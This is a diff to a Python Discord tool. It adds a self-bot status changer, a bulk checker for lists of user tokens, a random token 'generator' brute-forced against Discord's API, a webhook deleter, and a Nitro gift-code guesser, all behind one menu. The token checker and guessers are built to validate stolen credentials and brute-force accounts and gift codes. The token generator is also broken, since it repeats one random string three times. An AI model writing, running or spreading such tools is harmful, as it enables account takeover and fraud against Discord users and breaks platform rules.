@@ -1,41 +1,245 @@
+import os
+import random
+import string
+import threading
+import ctypes
+import sys
+import time
 import requests
 import json
-import time
+from tkinter import filedialog, Tk
+from tqdm import tqdm
 
+# I'm still working on this, but I just thought I would share my new progress on it lol
+
+# Constants for ANSI color codes
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+PURPLE = '\033[95m'
+RESET = '\033[0m'
+
+# Set command prompt title
+def set_cmd_title(title):
+    ctypes.windll.kernel32.SetConsoleTitleW(title)
+
+# Clear the screen
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Slowly type a message
+def slow_type(message):
+    for char in message:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(0.05)
+    time.sleep(1)
+    # Slowly delete the message
+    for char in message[::-1]:
+        sys.stdout.write('\b \b')
+        sys.stdout.flush()
+        time.sleep(0.05)
+
+# Auto Status Changer
 STATUS_API_URL = "https://discord.com/api/v9/users/@me/settings"
 
 def change_status(token, new_status):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json"
-    }
-    payload = {
-        "custom_status": {
-            "text": new_status,
-            "emoji_id": None,
-            "emoji_name": None
-        }
-    }
+    headers = {"Authorization": token, "Content-Type": "application/json"}
+    payload = {"custom_status": {"text": new_status, "emoji_id": None, "emoji_name": None}}
     response = requests.patch(STATUS_API_URL, headers=headers, data=json.dumps(payload))
     if response.status_code == 200:
-        print("\033[92mSuccessfully changed status\033[0m")
+        print(f"{GREEN}Successfully changed status{RESET}")
     else:
-        print("\033[91mFailed to change status. Please make sure you put in a real token!\033[0m")
+        print(f"{RED}Failed to change status. Please make sure you put in a real token!{RESET}")
 
-def main():
-    token = "YOUR USER TOKEN GOES HERE"
+def auto_status_changer():
+    token = input("Insert token: ")
+    set_cmd_title("Made by Axe")
+    
     statuses = []
     while True:
-        new_status = input("\033[95mEnter a new status: \033[0m")
-        statuses.append(new_status)
-        choice = input("\033[95mDo you want to add another status? (yes/no): \033[0m")
-        if choice.lower() != 'yes':
+        new_status = input(f"{PURPLE}Enter a new status (or press Enter to stop): {RESET}")
+        if new_status == "":
             break
+        statuses.append(new_status)
+
+    delay_ms = float(input(f"{PURPLE}Enter the delay between each status change (in milliseconds): {RESET}"))
 
     while True:
         for status in statuses:
             change_status(token, status)
-            time.sleep(0.5)
+            time.sleep(delay_ms / 1000)
+
+
+# Discord Token Checker
+def check_token(session, token, result_list, pbar):
+    url = 'https://discord.com/api/v9/users/@me'
+    headers = {'Authorization': token}
+    response = session.get(url, headers=headers)
+    result_list.append((token, response.status_code == 200))
+    pbar.update(1)
+
+def check_tokens(tokens):
+    valid_tokens = []
+    session = requests.Session()
+    with tqdm(total=len(tokens), desc="Checking Tokens") as pbar:
+        for token in tokens:
+            url = 'https://discord.com/api/v9/users/@me'
+            headers = {'Authorization': token}
+            response = session.get(url, headers=headers)
+            if response.status_code == 200:
+                valid_tokens.append(token)
+            pbar.update(1)
+
+    return valid_tokens
+
+def export_valid_tokens_to_file(valid_tokens):
+    if valid_tokens:
+        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        file_path = os.path.join(desktop_path, 'valid_tokens.txt')
+
+        with open(file_path, 'w') as file:
+            for token in valid_tokens:
+                file.write(token + '\n')
+
+        print(f"{PURPLE}Valid tokens exported to {file_path}{RESET}")
+    else:
+        print(f"{RED}No valid tokens found.{RESET}")
+
+
+def browse_file():
+    root = Tk()
+    root.withdraw()
+    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+    if filename:
+        with open(filename, 'r') as file:
+            tokens = file.read().splitlines()
+        valid_tokens = check_tokens(tokens)
+        export_valid_tokens_to_file(valid_tokens)
+
+# Discord Webhook Deleter
+def delete_webhook(webhook_url):
+    try:
+        response = requests.delete(webhook_url)
+        if response.status_code == 204:
+            print(f"{PURPLE}Webhook deleted successfully.{RESET}")
+        else:
+            print(f"{RED}Failed to delete webhook.{RESET}")
+    except Exception as e:
+        print(f"{RED}An error occurred while deleting webhook: {str(e)}{RESET}")
+
+def webhook_deleter():
+    while True:
+        clear_screen()
+        print("Discord Webhook Deleter\n")
+        webhook_url = input(f"{PURPLE}Enter the Discord webhook URL you want to delete (or press Enter to return to the main menu): {RESET}")
+        if webhook_url == "":
+            break
+        delete_webhook(webhook_url)
+        choice = input(f"{PURPLE}Do you want to delete another webhook? (yes/no): {RESET}")
+        if choice.lower() != 'yes':
+            break
+
+
+# Discord Token Generator
+def generate_discord_token():
+    token = ''.join(random.choices(string.ascii_letters + string.digits, k=23))
+    return f"{token}.{token}.{token}"
+
+def generate_and_export_tokens(num_tokens):
+    valid_tokens = {}
+    threads = []
+    with tqdm(total=num_tokens, desc="Generating Tokens") as pbar:
+        for _ in range(num_tokens):
+            token = generate_discord_token()
+            thread = threading.Thread(target=check_token, args=(requests.Session(), token, valid_tokens, pbar))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+    valid_tokens = {token: valid for token, valid in valid_tokens.items() if valid}
+    if valid_tokens:
+        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        file_path = os.path.join(desktop_path, 'valid_tokens.txt')
+
+        with open(file_path, 'w') as file:
+            for token in valid_tokens:
+                file.write(token + '\n')
+
+        print(f"{PURPLE}{len(valid_tokens)} valid tokens generated and exported to {file_path}{RESET}")
+    else:
+        print(f"{RED}No valid tokens generated.{RESET}")
+
+def check_token_validity(token):
+    url = 'https://discord.com/api/v9/users/@me'
+    headers = {'Authorization': token}
+    response = requests.get(url, headers=headers)
+    return response.status_code == 200
+
+# Nitro Generator
+def nitro_generator():
+    num_codes = int(input("How many Nitro codes do you want to generate? "))
+    generate_and_export_codes(num_codes)
+
+def generate_and_export_codes(num_codes):
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    file_path = os.path.join(desktop_path, 'nitro_codes.txt')
+
+    with open(file_path, 'w') as file:
+        threads = []
+        for _ in range(num_codes):
+            thread = threading.Thread(target=generate_and_check_code, args=(file,))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+    print(f"{PURPLE}{num_codes} Nitro codes generated and exported to {file_path}{RESET}")
+
+def generate_and_check_code(file):
+    code = generate_nitro_code()
+    validity = check_nitro_code_validity(code)
+    color = GREEN if validity == "valid" else RED if validity == "invalid" else YELLOW
+    print(f"{color}{code} - {validity.capitalize()}{RESET}")
+    file.write(f"{code} - {validity.capitalize()}\n")
+
+def check_nitro_code_validity(code):
+    url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        return "valid"
+    elif response.status_code == 404:
+        return "invalid"
+    else:
+        return "unknown"
+
+def main():
+    slow_type("Made By Axe")
+    print("\n")
+    while True:
+        clear_screen()
+        print("Choose an option:")
+        print("1. Auto Status Changer")
+        print("2. Token Checker")
+        print("3. Webhook Deleter")
+        print("4. Nitro Generator")
+        print("5. Exit\n")
+        choice = input("Enter your choice: ")
+        if choice == '1':
+            auto_status_changer()
+        elif choice == '2':
+            browse_file()
+        elif choice == '3':
+            webhook_deleter()
+        elif choice == '4':
+            nitro_generator()
+        elif choice == '5':
+            break
+        else:
+            print("Invalid choice. Please enter a number from 1 to 5.")
 
 if __name__ == "__main__":
     main()
